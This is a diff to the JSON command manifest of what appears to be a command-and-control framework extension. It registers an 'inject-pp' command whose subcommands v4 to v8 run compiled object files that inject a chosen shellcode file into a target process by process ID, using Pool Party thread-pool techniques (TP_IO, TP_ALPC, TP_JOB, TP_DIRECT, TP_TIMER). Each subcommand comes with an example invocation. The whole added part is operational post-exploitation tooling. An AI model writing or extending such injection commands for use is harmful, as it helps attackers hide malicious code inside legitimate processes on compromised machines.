@@ -29,6 +29,71 @@
         "FILE <shellcode>"
       ],
       "exec": "execute bof $EXT_DIR()/_bin/inject_sec.$ARCH().o $PACK_BOF(INT {pid}, BYTES {shellcode})"
+    },
+    {
+      "type": "command",
+      "agents": ["beacon"],
+
+      "command": "inject-pp",
+      "description": "Injects desired shellcode into target process using pool party techniques 4-8",
+      "subcommands":
+      [
+        {
+          "name": "v4",
+          "description": "Inject using TP_IO pool party technique",
+          "message": "Task: Executing PoolPartyBof variant 4 by 0xEr3bus",
+          "example": "inject-pp v4 808 /tmp/shellcode.bin",
+          "args": [
+            "INT <pid>",
+            "FILE <shellcode>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/inject_pp_4.$ARCH().o $PACK_BOF(INT {pid}, BYTES {shellcode})"
+        },
+        {
+          "name": "v5",
+          "description": "Inject using TP_ALPC pool party technique",
+          "message": "Task: Executing PoolPartyBof variant 5 by 0xEr3bus",
+          "example": "inject-pp v5 808 /tmp/shellcode.bin",
+          "args": [
+            "INT <pid>",
+            "FILE <shellcode>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/inject_pp_5.$ARCH().o $PACK_BOF(INT {pid}, BYTES {shellcode})"
+        },
+        {
+          "name": "v6",
+          "description": "Inject using TP_JOB pool party technique",
+          "message": "Task: Executing PoolPartyBof variant 6 by 0xEr3bus",
+          "example": "inject-pp v6 808 /tmp/shellcode.bin",
+          "args": [
+            "INT <pid>",
+            "FILE <shellcode>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/inject_pp_6.$ARCH().o $PACK_BOF(INT {pid}, BYTES {shellcode})"
+        },
+        {
+          "name": "v7",
+          "description": "Inject using TP_DIRECT pool party technique",
+          "message": "Task: Executing PoolPartyBof variant 7 by 0xEr3bus",
+          "example": "inject-pp v7 808 /tmp/shellcode.bin",
+          "args": [
+            "INT <pid>",
+            "FILE <shellcode>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/inject_pp_7.$ARCH().o $PACK_BOF(INT {pid}, BYTES {shellcode})"
+        },
+        {
+          "name": "v8",
+          "description": "Inject using TP_TIMER pool party technique",
+          "message": "Task: Executing PoolPartyBof variant 8 by 0xEr3bus",
+          "example": "inject-pp v8 808 /tmp/shellcode.bin",
+          "args": [
+            "INT <pid>",
+            "FILE <shellcode>"
+          ],
+          "exec": "execute bof $EXT_DIR()/_bin/inject_pp_8.$ARCH().o $PACK_BOF(INT {pid}, BYTES {shellcode})"
+        }
+      ]
     }
   ]
 }
